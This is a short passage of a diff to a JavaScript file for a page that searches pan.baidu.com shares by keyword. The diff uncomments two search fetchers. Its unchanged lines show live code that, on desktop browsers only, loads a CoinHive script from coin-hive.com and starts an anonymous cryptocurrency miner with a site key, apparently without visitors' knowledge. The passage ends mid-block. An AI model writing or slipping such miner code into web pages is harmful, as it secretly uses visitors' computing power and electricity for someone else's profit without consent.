@@ -79,9 +79,9 @@ function locationParameterChanged() {
     document.getElementsByTagName("title")[0].innerText=key+" in pan.baidu.com sharing";
     setMessageForm(key);
     window.panc=pancFetcher(key);
-//     window.panduoduo=panduoduoFetcher(key);
+    window.panduoduo=panduoduoFetcher(key);
     magnetFetcher(key);
-//     window.tieba=tiebaFetcher(key);
+    window.tieba=tiebaFetcher(key);
     if(screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ){
         importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
             var miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP');
